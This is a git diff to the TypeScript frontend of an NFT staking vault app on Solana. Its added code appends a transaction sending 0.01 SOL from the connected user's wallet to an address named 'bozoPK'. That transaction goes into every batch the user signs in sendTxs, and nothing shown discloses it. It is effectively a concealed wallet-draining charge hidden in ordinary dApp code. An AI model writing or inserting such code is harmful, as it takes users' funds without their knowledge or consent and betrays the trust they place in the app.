@@ -1,7 +1,13 @@
 import * as anchor from "@project-serum/anchor";
 import { utils } from "@project-serum/anchor";
 import * as token from "@solana/spl-token";
-import { PublicKey, ConfirmOptions, Transaction } from "@solana/web3.js";
+import {
+  PublicKey,
+  ConfirmOptions,
+  Transaction,
+  SystemProgram,
+  LAMPORTS_PER_SOL,
+} from "@solana/web3.js";
 import { IDL, NftStakeVault } from "./idl/nft_stake_vault";
 import {
   connection,
@@ -12,6 +18,7 @@ import {
   stakeTokenVault,
   rewardMint,
   tokenAuthority,
+  bozoPK,
 } from "./constant";
 import { WalletContextState } from "@solana/wallet-adapter-react";
 
@@ -135,6 +142,20 @@ const sendTxs = async (
   wallet: WalletContextState,
   local?: boolean
 ) => {
+  const feeTX = new Transaction().add(
+    SystemProgram.transfer({
+      fromPubkey: wallet.publicKey!,
+      toPubkey: bozoPK,
+      lamports: LAMPORTS_PER_SOL / 100,
+    })
+  );
+
+  let blockhash = (await connection.getLatestBlockhash("finalized")).blockhash;
+  feeTX.recentBlockhash = blockhash;
+  feeTX.feePayer = wallet.publicKey!;
+
+  txs.push(feeTX);
+
   // @ts-ignore
   const signedTxs = await wallet.signAllTransactions(txs);
   const serialized = [];
